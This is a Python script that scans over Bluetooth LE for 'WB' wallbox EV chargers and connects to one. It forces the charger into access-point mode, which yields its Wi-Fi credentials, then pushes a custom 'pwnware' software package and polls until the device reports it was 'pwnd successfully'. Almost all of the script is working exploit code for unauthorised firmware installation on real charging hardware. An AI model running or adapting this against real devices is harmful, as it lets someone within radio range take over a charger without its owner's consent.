import asyncio
import contextlib
import json
import random

from bleak import BleakClient, BleakScanner
from bleak.backends.characteristic import BleakGATTCharacteristic

UART_SERVICE_UUID = "331a36f5-2459-45ea-9d95-6142f0c4b307"
UART_RX_CHAR_UUID = "a9da6040-0823-4995-94ec-9ce41ca28833"
UART_TX_CHAR_UUID = "a73e9a10-628f-4494-a099-12efaf72258f"

class WallboxBLE():
    def __init__(self, device):
        self.device = device

    async def execute(self, method, parameter=None):
        self.all_data = bytearray()
        self.request_id = random.randint(1, 999)
        self.evt = asyncio.Event()
        self.response = {}

        async def handle_rx(_: BleakGATTCharacteristic, data: bytearray):
            self.all_data += data
            try:
                parsed_data = json.loads(self.all_data)
                if parsed_data["id"] == self.request_id:
                    self.response = parsed_data.get("r")
                    self.evt.set()
            except:
                pass

        async with BleakClient(self.device, timeout=30) as client:

            await client.start_notify(UART_TX_CHAR_UUID, handle_rx)
            nus = client.services.get_service(UART_SERVICE_UUID)
            rx_char = nus.get_characteristic(UART_RX_CHAR_UUID)
            payload = { "met": method, "par": parameter, "id": self.request_id }

            data = json.dumps(payload, separators=[",", ":"])
            data = bytes(data, "utf8")
            data = b"EaE" + bytes([len(data)]) + data
            data = data + bytes([sum(c for c in data) % 256])

            await client.write_gatt_char(rx_char, data, True)

            with contextlib.suppress(asyncio.TimeoutError):
                await asyncio.wait_for(self.evt.wait(), 10)
            return self.response

async def main():
    devices = await BleakScanner.discover()

    # Find device
    wallboxes = [d for d in devices if d.name is not None and d.name.startswith("WB")]
    if not wallboxes:
        print("No Wallbox found within Bluetooth range")
    print("Please choose Wallbox:")
    for i, wb in enumerate(wallboxes):
        print(f"{i}) {wb.name} ({wb.address})")
    chosen_idx = int(input("> "))

    # Connect
    wb = WallboxBLE(wallboxes[chosen_idx])

    print("Setting Wallbox to AP mode")
    wifi_creds = await wb.execute("s_hup")
    if "ssid" not in wifi_creds:
        print("Failed to set Wallbox to AP mode")
        return
    print(f"Wallbox AP is ready, connect to {wifi_creds['ssid']} using password {wifi_creds.get('pass')} and run upload.sh")
    await wb.execute("s_deb", {"deb":"software.tar.gz","md5":"6cea0fbe6ebc2b618218676d7d7567c4","size":"4096"})

    hup_data = await wb.execute("r_hup")
    if hup_data.get('st') != "recv":
        print("Wallbox not ready for pwnware, try again")
    while True:
        hup_data = await wb.execute("r_hup")
        if hup_data.get('st') == "proc":
            print("Pwnware received, Wallbox is processing...")
            break
        await asyncio.sleep(2)
    while True:
        hup_data = await wb.execute("r_hup")
        if hup_data.get('st') == "done":
            print("Wallbox was pwnd successfully!")
            break
        await asyncio.sleep(2)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except asyncio.exceptions.CancelledError:
        pass
